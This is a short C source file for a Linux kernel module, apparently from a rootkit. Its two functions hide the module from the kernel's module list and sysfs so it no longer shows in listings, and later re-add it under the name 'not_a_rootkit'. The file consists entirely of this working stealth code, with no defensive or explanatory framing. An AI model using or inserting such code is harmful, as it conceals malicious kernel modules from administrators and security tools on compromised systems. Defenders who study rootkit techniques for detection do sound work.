#include <module_hide.h>

void hide_module(int *module_is_hidden) {

	if (*module_is_hidden) {
		return;
	}

	module_previous = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	kobject_del(&THIS_MODULE->mkobj.kobj);
	*module_is_hidden = 1;
}

void unhide_module(int *module_is_hidden) {

	if (!(*module_is_hidden)) {
		return;
	}

	list_add(&THIS_MODULE->list, module_previous);
	kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, "not_a_rootkit");
	*module_is_hidden = 0;	
}